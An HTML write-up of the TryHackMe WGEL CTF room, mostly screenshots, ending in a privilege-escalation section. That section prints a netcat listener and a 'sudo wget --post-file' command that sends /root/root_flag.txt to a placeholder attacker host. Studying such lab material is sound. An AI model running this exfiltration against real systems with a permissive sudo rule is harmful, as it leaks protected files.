<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WGE LCTF | TryHackMe Writeup</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html {
      scroll-behavior: smooth;
    }
    body {
      background-color: #0d0d0d;
      color: #b9fbc0;
      font-family: 'Courier New', monospace;
      padding: 2em;
      max-width: 900px;
      margin: auto;
    }
    h1, h2 {
      color: #00f5d4;
    }
    h3 {
      color: #ff4ecd;
    }
    a {
      color: #85f4ff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    img {
      width: 100%;
      border: 2px solid #333;
      border-radius: 8px;
      margin: 1.5em 0;
    }
    code {
      background-color: #1a1a1a;
      padding: 2px 6px;
      border-radius: 4px;
      color: #00ff88;
    }
    pre {
      background-color: #111;
      padding: 12px;
      overflow-x: auto;
      border-left: 4px solid #00d9ff;
      border-radius: 6px;
    }
    .section {
      margin-bottom: 3em;
    }

    /* Sidebar Styles */
    .sidebar {
      position: fixed;
      top: 100px;
      left: 20px;
      width: 160px;
      background: rgba(20, 20, 40, 0.85);
      border: 1px solid #00f5d4;
      padding: 1em;
      border-radius: 10px;
      font-size: 0.9em;
      z-index: 999;
    }

    .sidebar h3 {
      color: #00f5d4;
      font-size: 1.1em;
      margin-bottom: 0.6em;
      text-align: center;
    }

    .sidebar ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }

    .sidebar li {
      margin-bottom: 0.6em;
    }

    .sidebar a {
      color: #b9fbc0;
      text-decoration: none;
    }

    .sidebar a:hover {
      color: #ff4ecd;
      text-shadow: 0 0 5px #ff4ecd;
    }

    /* Add top margin so content doesn't hide behind sidebar */
    @media (max-width: 1000px) {
      .sidebar {
        display: none;
      }
    }
  </style>
</head>
<body>

  <!-- Sidebar -->
  <div class="sidebar">
    <h3>☰ Quick Nav</h3>
    <ul>
      <li><a href="#recon">🔎 Recon</a></li>
      <li><a href="#apache">🌐 Apache</a></li>
      <li><a href="#sitemap">📂 /sitemap</a></li>
      <li><a href="#gobuster">🛠️ Gobuster</a></li>
      <li><a href="#comment">👀 Comment</a></li>
      <li><a href="#ssh">🔑 SSH Key</a></li>
      <li><a href="#login">🔐 SSH Login</a></li>
      <li><a href="#sudo">🧪 Sudo Priv</a></li>
      <li><a href="#userflag">📜 User Flag</a></li>
      <li><a href="#privesc">⚡ PrivEsc</a></li>
      <li><a href="#rootflag">🏁 Root Flag</a></li>
      <li><a href="#summary">✅ Summary</a></li>
    </ul>
  </div>

  <h1>🚩 TryHackMe – WGEL CTF Writeup</h1>
  <p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGEL CTF</a></p>

  <div class="section" id="recon">
    <h2>🔎 Initial Recon</h2>
    <img src="assets/img/wgel/scan.png" alt="Nmap scan">
    <ul>
      <li>22/tcp – SSH</li>
      <li>80/tcp – HTTP (Apache 2.4.18)</li>
    </ul>
  </div>

  <div class="section" id="apache">
    <h2>🌐 Apache Default Page</h2>
    <img src="assets/img/wgel/apache-server.png" alt="Apache default">
  </div>

  <div class="section" id="sitemap">
    <h2>📂 Hidden Page Discovered</h2>
    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template">
  </div>

  <div class="section" id="gobuster">
    <h2>🛠️ Gobuster Enumeration</h2>
    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster root">
    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster sitemap">
  </div>

  <div class="section" id="comment">
    <h2>👀 Developer Comment</h2>
    <img src="assets/img/wgel/source-code.png" alt="Comment">
    <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
  </div>

  <div class="section" id="ssh">
    <h2>🔑 SSH Key Disclosure</h2>
    <img src="assets/img/wgel/ssh-found.png" alt="SSH Key">
  </div>

  <div class="section" id="login">
    <h2>🔐 SSH Access Gained</h2>
    <img src="assets/img/wgel/ssh-login.png" alt="SSH login">
  </div>

  <div class="section" id="sudo">
    <h2>🧪 Sudo Privileges Review</h2>
    <img src="assets/img/wgel/sudo-l.png" alt="sudo -l">
  </div>

  <div class="section" id="userflag">
    <h2>📜 user_flag.txt Captured</h2>
    <img src="assets/img/wgel/userflag.txt.png" alt="User flag">
  </div>

  <div class="section" id="privesc">
    <h2>⚡ Manual PrivEsc via wget --post-file</h2>
    <p>GTFOBins' reverse shell using wget didn't work on this host, so I manually used <code>--post-file</code> to exfiltrate <code>/root/root_flag.txt</code>.</p>
    <img src="assets/img/wgel/wget-vuln.png" alt="wget trick">
    <pre><code># Attacker:
nc -lvnp 80

# Victim:
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
  </div>

  <div class="section" id="rootflag">
    <h2>🏁 root_flag.txt Captured</h2>
    <img src="assets/img/wgel/rootflag.png" alt="Root flag">
  </div>

  <div class="section" id="summary">
    <h2>✅ Summary</h2>
    <ul>
      <li>Leaked SSH key → access as <code>jessie</code></li>
      <li><code>wget</code> as sudo → used <code>--post-file</code> for root flag</li>
      <li>Flags captured: <code>user_flag.txt ✅</code> <code>root_flag.txt ✅</code></li>
    </ul>
  </div>

</body>
</html>

